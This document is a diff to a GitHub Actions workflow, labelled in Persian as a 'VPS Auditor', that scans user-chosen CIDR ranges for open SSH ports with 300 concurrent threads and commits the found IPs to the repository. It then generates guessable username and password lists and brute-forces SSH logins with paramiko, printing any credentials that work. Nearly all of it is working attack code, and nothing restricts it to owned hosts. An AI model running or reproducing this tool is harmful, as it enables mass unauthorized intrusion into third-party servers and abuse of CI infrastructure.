@@ -1,37 +1,38 @@
-name: VPS Auditor - with IP Discovery
+name: VPS Auditor – Explorer Mode
 
 on:
   workflow_dispatch:
     inputs:
-      scan_range:
-        description: 'رنج CIDR برای اسکن خودکار (مثلاً 192.168.1.0/24). خالی بذار برای استفاده از لیست دستی'
-        required: false
-      targets:
-        description: 'IPهای هدف (در صورت پر نبودن scan_range)'
-        required: false
       mode:
-        description: 'منبع لیست اعتبارنامه'
+        description: 'حالت'
         required: true
-        default: 'auto'
+        default: 'explorer'
         type: choice
         options:
+          - explorer
           - auto
           - manual
+      scan_range:
+        description: 'رنج CIDR (برای explorer) - مثال: 192.168.1.0/24'
+        required: false
       keywords:
-        description: 'کلمات کلیدی (برای حالت auto)'
+        description: 'کلمات کلیدی برای ListForge (برای auto/explorer)'
+        required: false
+      targets:
+        description: 'IPهای دستی (برای manual)'
         required: false
       usernames:
-        description: 'یوزرنیم‌های دستی (برای حالت manual)'
+        description: 'یوزرنیم‌های دستی (برای manual)'
         required: false
       passwords:
-        description: 'پسوردهای دستی (برای حالت manual)'
+        description: 'پسوردهای دستی (برای manual)'
         required: false
       port:
         description: 'پورت SSH'
         required: true
         default: '22'
       timeout:
-        description: 'زمان انتظار (ثانیه)'
+        description: 'زمان انتظار'
         required: true
         default: '5'
 
@@ -44,22 +45,22 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: نصب پیش‌نیاز
+      - name: نصب
         run: pip3 install paramiko rich
 
-      - name: اجرای IP Scanner + VPS Auditor
+      - name: اجرای VPS Auditor
         env:
-          SCAN_RANGE: ${{ github.event.inputs.scan_range }}
-          TARGETS_INPUT: ${{ github.event.inputs.targets }}
           MODE: ${{ github.event.inputs.mode }}
+          SCAN_RANGE: ${{ github.event.inputs.scan_range }}
           KEYWORDS: ${{ github.event.inputs.keywords }}
+          TARGETS_INPUT: ${{ github.event.inputs.targets }}
           USERNAMES_INPUT: ${{ github.event.inputs.usernames }}
           PASSWORDS_INPUT: ${{ github.event.inputs.passwords }}
           PORT: ${{ github.event.inputs.port }}
           TIMEOUT: ${{ github.event.inputs.timeout }}
         run: |
           python3 << 'PYEOF'
-          import os, sys, socket, time, random, string, ipaddress, concurrent.futures
+          import os, sys, socket, time, ipaddress, concurrent.futures, random
           from datetime import datetime
           from rich.console import Console
           from rich.table import Table
@@ -67,14 +68,22 @@ jobs:
           import paramiko
 
           console = Console()
-          console.print(Panel.fit("[bold yellow]🗝️ VPS Auditor with IP Discovery[/bold yellow]", border_style="yellow"))
+          console.print(Panel.fit("[bold yellow]🗝️ VPS Auditor – Explorer Mode[/bold yellow]", border_style="yellow"))
 
-          # ========== ۱. IP Scanner ==========
-          scan_range = os.environ.get("SCAN_RANGE", "").strip()
-          discovered_ips = []
+          MODE = os.environ["MODE"]
+          PORT = int(os.environ["PORT"])
+          TIMEOUT = int(os.environ["TIMEOUT"])
 
-          if scan_range:
-              console.print(f"🔍 اسکن رنج {scan_range} برای پورت ۲۲...")
+          # ===== ۱. IP Discovery =====
+          targets = []
+
+          if MODE == "explorer":
+              scan_range = os.environ.get("SCAN_RANGE", "").strip()
+              if not scan_range:
+                  console.print("[red]❌ برای Explorer Mode باید scan_range وارد کنید[/red]")
+                  sys.exit(1)
+
+              console.print(f"🔍 Explorer Mode: اسکن {scan_range} برای پورت {PORT}...")
               try:
                   network = ipaddress.IPv4Network(scan_range, strict=False)
                   ips = [str(ip) for ip in network.hosts()]
@@ -82,36 +91,32 @@ jobs:
                   console.print("[red]❌ رنج CIDR نامعتبر[/red]")
                   sys.exit(1)
 
+              console.print(f"⏳ اسکن {len(ips)} آی‌پی با 300 نخ هم‌زمان...")
               def check_ip(ip):
                   try:
                       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                      sock.settimeout(0.5)
-                      result = sock.connect_ex((ip, 22))
+                      sock.settimeout(0.3)
+                      result = sock.connect_ex((ip, PORT))
                       sock.close()
                       return ip if result == 0 else None
                   except:
                       return None
 
-              console.print(f"⏳ اسکن {len(ips)} آی‌پی...")
-              with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
+              with concurrent.futures.ThreadPoolExecutor(max_workers=300) as executor:
                   future_to_ip = {executor.submit(check_ip, ip): ip for ip in ips}
                   for future in concurrent.futures.as_completed(future_to_ip):
                       ip = future.result()
                       if ip:
-                          discovered_ips.append(ip)
-                          console.print(f"[green]✓ {ip} باز[/green]")
+                          targets.append(ip)
+                          console.print(f"[green]✓ {ip}[/green]")
 
-              console.print(f"\n[green]✅ {len(discovered_ips)} آی‌پی با پورت ۲۲ باز پیدا شد[/green]")
-
-              # ذخیره توی فایل
+              console.print(f"\n[green]✅ {len(targets)} آی‌پی با پورت {PORT} باز پیدا شد[/green]")
               with open("discovered_ips.txt", "w") as f:
-                  for ip in discovered_ips:
+                  for ip in targets:
                       f.write(ip + "\n")
-              os.system("git add discovered_ips.txt && git commit -m 'Add discovered IPs' && git push 2>/dev/null || true")
+              os.system("git add discovered_ips.txt && git commit -m 'Explorer IPs' && git push 2>/dev/null || true")
 
-              targets = discovered_ips if discovered_ips else []
-          else:
-              # استفاده از لیست دستی
+          elif MODE in ("auto", "manual"):
               targets_input = os.environ.get("TARGETS_INPUT", "").strip()
               if os.path.exists(targets_input):
                   with open(targets_input) as f:
@@ -120,54 +125,46 @@ jobs:
                   targets = [x.strip() for x in targets_input.split(',') if x.strip()]
 
           if not targets:
-              console.print("[red]❌ هیچ آی‌پی هدفی پیدا نشد[/red]")
+              console.print("[red]❌ هیچ IP هدفی پیدا نشد[/red]")
               sys.exit(1)
 
-          console.print(f"🎯 تعداد هدف‌ها: {len(targets)}")
-
-          # ========== ۲. ListForge ==========
-          mode = os.environ["MODE"]
-          port = int(os.environ["PORT"])
-          timeout = int(os.environ["TIMEOUT"])
-
+          # ===== ۲. ListForge =====
           def generate_usernames(keywords):
               base = ["root", "admin", "user", "test", "guest", "ubuntu", "debian", "centos"]
               for kw in keywords:
-                  base.append(kw.lower())
-                  base.append(kw.capitalize())
+                  base.append(kw.lower()); base.append(kw.capitalize())
               return list(set(base))
 
           def generate_passwords(keywords):
-              base = ["123456", "password", "admin", "root", "12345678", "qwerty", "1q2w3e4r"]
-              years = ["2024", "2025", "2026", "2023"]
+              base = ["123456", "password", "admin", "root", "12345678", "qwerty"]
+              years = ["2024", "2025", "2026"]
               specials = ["!", "@", "#", "$", ""]
               for kw in keywords:
-                  kw_lower = kw.lower()
-                  kw_cap = kw.capitalize()
+                  kw_lower = kw.lower(); kw_cap = kw.capitalize()
                   for yr in years:
                       for sp in specials:
                           base.append(f"{kw_cap}{yr}{sp}")
                           base.append(f"{kw_lower}{yr}{sp}")
                           base.append(f"{kw_lower}@{yr}")
-                  base.append(kw_lower)
-                  base.append(kw_cap)
+                  base.append(kw_lower); base.append(kw_cap)
               return list(set(base))
 
-          if mode == "manual":
+          if MODE in ("explorer", "auto"):
+              keywords_input = os.environ.get("KEYWORDS", "").strip()
+              if not keywords_input:
+                  console.print("[yellow]⚠️ کلمه کلیدی وارد نشد. از پیش‌فرض استفاده می‌شود[/yellow]")
+                  keywords_input = "admin,web,server,vps"
+              keywords = [k.strip() for k in keywords_input.split(',') if k.strip()]
+              usernames = generate_usernames(keywords)
+              passwords = generate_passwords(keywords)
+              console.print(f"[green]📝 ListForge: {len(usernames)} یوزرنیم | {len(passwords)} پسورد[/green]")
+          else:
               usernames_input = os.environ.get("USERNAMES_INPUT", "").strip()
               passwords_input = os.environ.get("PASSWORDS_INPUT", "").strip()
               usernames = [x.strip() for x in usernames_input.split(',') if x.strip()] if usernames_input else ["root"]
               passwords = [x.strip() for x in passwords_input.split(',') if x.strip()] if passwords_input else ["123456"]
-          else:
-              keywords_input = os.environ.get("KEYWORDS", "").strip()
-              if not keywords_input:
-                  keywords_input = "admin,web,server"
-              keywords = [k.strip() for k in keywords_input.split(',') if k.strip()]
-              usernames = generate_usernames(keywords)
-              passwords = generate_passwords(keywords)
-              console.print(f"[green]📝 ListForge: {len(usernames)} یوزرنیم، {len(passwords)} پسورد[/green]")
 
-          # ========== ۳. تست SSH ==========
+          # ===== ۳. تست SSH =====
           results = []
           total = len(targets) * len(usernames) * len(passwords)
           attempt = 0
@@ -179,8 +176,8 @@ jobs:
                       try:
                           client = paramiko.SSHClient()
                           client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                          client.connect(hostname=target, port=port, username=username, password=password,
-                                         timeout=timeout, allow_agent=False, look_for_keys=False)
+                          client.connect(hostname=target, port=PORT, username=username, password=password,
+                                         timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
                           console.print(f"\n[green]✅ موفق: {target} {username}:{password}[/green]")
                           results.append({"target":target,"username":username,"password":password,"status":"SUCCESS"})
                           client.close()
@@ -190,7 +187,7 @@ jobs:
                           console.print(f"\n[yellow]⚠️ خطا در {target}: {e}[/yellow]")
                           break
 
-          # ========== ۴. گزارش ==========
+          # ===== ۴. گزارش =====
           successes = [r for r in results if r["status"] == "SUCCESS"]
           if successes:
               tbl = Table(title="✅ Successful", show_header=True, header_style="bold white")
